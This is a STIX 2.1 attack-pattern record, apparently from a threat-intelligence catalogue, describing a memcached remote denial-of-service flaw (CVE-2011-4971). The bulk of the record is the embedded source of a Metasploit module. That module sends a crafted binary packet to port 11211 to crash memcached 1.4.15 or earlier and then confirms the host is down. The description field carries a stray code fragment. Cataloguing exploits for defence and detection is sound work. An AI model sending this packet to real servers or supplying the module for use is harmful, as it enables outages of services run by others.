{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f6e8d8a1-e2bd-481d-972b-0289f873bc0e",
    "created": "2024-08-14T16:24:54.973251Z",
    "modified": "2024-08-14T16:24:54.973255Z",
    "name": "Memcached Remote Denial of Service",
    "description": " This module sends a specially-crafted packet to cause a segmentation fault in memcached v1.4.15 or earlier versions.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/misc/memcached.rb",
            "external_id": "memcached.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4971"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Memcached Remote Denial of Service',\n      'Description'   => %q{\n        This module sends a specially-crafted packet to cause a\n        segmentation fault in memcached v1.4.15 or earlier versions.\n      },\n      'References' =>\n        [\n          [ 'URL', 'https://code.google.com/archive/p/memcached/issues/192' ],\n          [ 'CVE', '2011-4971' ],\n          [ 'OSVDB', '92867' ]\n        ],\n      'Author'       => [ 'Gregory Man <man.gregory[at]gmail.com>' ],\n      'License'      => MSF_LICENSE\n    ))\n\n    register_options([Opt::RPORT(11211),])\n  end\n\n  def is_alive?\n    begin\n      connect\n      disconnect\n    rescue Rex::ConnectionRefused\n      return false\n    end\n\n    return true\n  end\n\n  def run\n    connect\n    pkt =  \"\\x80\\x12\\x00\\x01\\x08\\x00\\x00\\x00\\xff\\xff\\xff\\xe8\\x00\\x00\\x00\\x00\"\n    pkt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x01\\x00\\x00\\x00\"\n    pkt << \"\\x00\\x00\\x00\\x00\\x00\\x000\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    pkt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n\n    print_status(\"#{rhost}:#{rport} - Sending dos packet...\")\n    sock.put(pkt)\n    disconnect\n\n    print_status(\"#{rhost}:#{rport} - Checking host status...\")\n    select(nil, nil, nil, 1)\n\n    if is_alive?\n      print_error(\"#{rhost}:#{rport} - The DoS attempt did not work, host is still alive\")\n    else\n      print_good(\"#{rhost}:#{rport} - Tango down\")  # WWJS - What would th3j35t3r say?\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Gregory Man <man.gregory[at]gmail.com> ]",
        ""
    ]
}